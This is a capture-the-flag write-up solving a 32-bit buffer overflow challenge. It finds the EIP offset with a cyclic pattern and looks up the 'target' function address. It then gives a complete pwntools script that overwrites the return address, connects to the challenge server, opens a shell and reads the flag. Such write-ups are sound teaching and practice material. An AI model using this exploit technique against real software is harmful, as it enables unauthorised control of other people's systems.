# Baby Buffer Overflow - 32bit
Can you command this program to where it cannot go?
To get the flag, you must somehow take control of its excecution.
Is it even possible?

## Solution
I could not run the pre-compiled program on my Ubuntu machine, so I re-compiled using the command in the source code. This changed the addresses, but it means that I can find the exploit.

First, I needed to determine the offset to `EIP` (instruction pointer). To do this, I generated a cyclic pattern:

```python
from pwn import cyclic

pattern = cyclic(100)
with open('pattern.bin', 'wb') as f:
    f.write(pattern)
```

Then I sent the pattern to the program using pwndbg:

```bash
gdb -q ./babybufov
(gdb) run < pattern.bin

> Program received signal SIGSEGV, Segmentation fault.
> 0x61616168 in ?? ()
```
`0x61616168` is the value of EIP, now we need to calculate the offset:

```python
from pwn import cyclic_find

eip_value = 0x61616168  # Value from EIP
offset = cyclic_find(eip_value)
print(offset)  # Output: 28
```

The offset is 28 bytes.

Now, I needed to find the address of the function "target", which is the function we need to reach:

`objdump -d babybufov | grep target`

Finally, I can craft an exploit to overwrite the return address to the one of `target`:

```python
from pwn import *

# Offset to EIP
offset = 28

# Address of the target function
target_address = 0x080491b6

# Craft the payload
payload = b'A' * offset
payload += p32(target_address)
```

This worked well on the binary that I compiled, but not on the remove server. I checked the `target` address for the original file using `objdump` again. The address was different: `0x080491f5`.

Then I make a new script with the address from the original file, and send it to the server:

```python
from pwn import *

# Set up pwntools context
context(arch='i386', os='linux', endian='little')

# Address of the target function
target_address = 0x080491f5  # As per your information

# Offset to EIP
offset_to_eip = 28  # Determined from previous analysis

# Construct the payload
payload = b'A' * offset_to_eip
payload += p32(target_address)  # Pack the address in little-endian format

# Connect to the remote server
io = remote('challenge.ctf.games', 32338)

# Receive until the prompt "Gimme some data!"
io.recvuntil(b'Gimme some data!\n')

# Send the payload
io.sendline(payload)

# Interact with the shell
io.interactive()
```

This gave me an interactive shell, which meant that I could do the following:

```bash
$ ls
babybufov
flag.txt
$ cat flag.txt
```
